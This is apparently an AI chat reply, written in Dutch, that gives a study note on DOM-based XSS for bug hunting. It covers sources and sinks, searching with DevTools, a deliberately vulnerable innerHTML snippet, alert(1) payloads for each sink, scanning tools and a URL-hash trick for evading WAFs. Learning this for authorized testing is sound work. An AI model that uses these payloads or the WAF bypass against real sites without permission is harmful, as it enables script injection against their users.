

it is een unieke categorie. In tegenstelling tot Reflected of Stored XSS, **ziet de server jouw payload vaak helemaal niet**. Alles gebeurt in de browser van het slachtoffer via JavaScript.

Hier is de complete Obsidian notitie voor **DOM-Based XSS**.

---

Markdown

````
# 🕸️ DOM-Based XSS

==Concept: De applicatie haalt data uit een "Source" (jouw input) en stopt dit onveilig in een "Sink" (uitvoer) zonder tussenkomst van de server backend.==



---

## 🧠 1. The Theory: Sources & Sinks
*Om DOM XSS te vinden, moet je in de JavaScript code zoeken naar de connectie tussen deze twee:*

### 📥 Sources (Waar komt data vandaan?)
Dit zijn JavaScript objecten die jij kunt controleren:
* `location.hash` (Alles na de `#` -> wordt **niet** naar server gestuurd! WAF ziet dit niet).
* `location.search` (Alles na de `?`).
* `document.referrer` (De vorige URL).
* `window.name` (Kan je zetten via `window.open`).

### 🗑️ Sinks (Waar gaat de data heen?)
Dit zijn functies die de data uitvoeren of renderen:
* **HTML Execution:** `document.write()`, `element.innerHTML`, `element.outerHTML`.
* **JavaScript Execution:** `eval()`, `setTimeout()`, `setInterval()`, `new Function()`.
* **Navigation:** `location.href`, `window.open()`.

---

## 🕵️‍♂️ 2. Manual Hunting (DevTools)
*Je jaagt hier niet met Burp Repeater, maar met Chrome DevTools (F12).*

**Stap 1: Zoek naar Sinks**
1.  Open DevTools -> tabblad **Sources**.
2.  Druk `Ctrl + Shift + F` (Zoek in alle files).
3.  Zoek naar: `innerHTML`, `location.hash`, `document.write`.

**Stap 2: Analyseer de Code**
Kijk of de variabele die in de sink gaat, afkomstig is van een source.
*Voorbeeld van kwetsbare code:*
```javascript
var user = location.hash.slice(1); // Source
document.getElementById("welcome").innerHTML = "Hello " + user; // Sink
````

**Stap 3: Exploit (In de browser)** Vul de source met je payload. URL: `target.com/#<img src=x onerror=alert(1)>`

---

## 💉 3. Payloads (Context is King)

_Niet elke payload werkt in elke Sink. `<script>` werkt bijvoorbeeld vaak NIET in `innerHTML`._

### Voor `innerHTML` & `outerHTML`

_Browsers voeren `<script>` tags die via innerHTML worden toegevoegd vaak niet uit om veiligheidsredenen. Gebruik event handlers._

HTML

```
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<iframe/onload=alert(1)>
```

### Voor `document.write()`

_Hier werkt alles, ook gewone script tags._

HTML

```
<script>alert(1)</script>
```

### Voor `javascript:` Sinks (location.href)

_Als de code doet: `location.href = url;`_ Payload: `javascript:alert(1)`

### Voor `eval()`

_Hier kun je direct JS typen, vaak moet je eerst uitbreken._ Payload: `1; alert(1); //`

---

## 🛠️ 4. Tools (Automated DOM Hunting)

**DOM Invader (Burp Suite Ingebouwd)** _Dit is op dit moment de beste tool._

1. Open Burp Browser.
    
2. Ga naar de extensie "DOM Invader" (in de adresbalk of settings).
    
3. Zet "On" aan.
    
4. Zet "Inject Canary" aan.
    
5. Browse over de site. Burp vult automatisch willekeurige tekens in forms/URL en schreeuwt als ze in een Sink terechtkomen.
    

**FinDOM-XSS (Terminal Tool)** _Snel scannen van JS bestanden op bekende sinks._

Bash

```
# Installeer eerst (requires bash script)
./findom-xss.sh -u [https://target.com/page.js](https://target.com/page.js)
./findom-xss.sh -f urls.txt
```

---

## 🛡️ 5. De "Hash" Trick (WAF Bypass)

Omdat `location.hash` (het hekje `#`) nooit naar de server wordt gestuurd, zien WAFs (Web Application Firewalls) je payload niet.

**URL:** `https://target.com/?q=<script>alert(1)</script>`

- **Server ziet:** `GET /?q=<script>...` -> **BLOCKED ⛔**
    

**URL:** `https://target.com/#<script>alert(1)</script>`

- **Server ziet:** `GET /` -> **ALLOWED ✅**
    
- **Browser:** Voert de JS uit die de hash uitleest en in de pagina zet.
    

---

## 📝 Checklist DOM XSS

- [ ] **Sinks:** Heb ik gezocht op `innerHTML` en `eval` in de .js bestanden?
    
- [ ] **Hash:** Heb ik geprobeerd parameters achter een `#` te zetten in plaats van `?`?
    
- [ ] **Payloads:** Heb ik `img` en `iframe` tags geprobeerd als `<script>` niet werkte?
    
- [ ] **Window.name:** Heb ik gecheckt of de site data uit `window.name` leest? (Dit is een bekende "hidden" source).
    

```

### Wat nu?
Dit maakt je XSS sectie wel heel compleet (Reflected, Stored en DOM).

De volgende logische stap zou zijn:
1.  **XXE (XML External Entity)** - Een compleet ander type data-injectie.
2.  **Logic Bugs** - Fouten in het koopproces of account types (vereist geen code, maar denkwerk).
```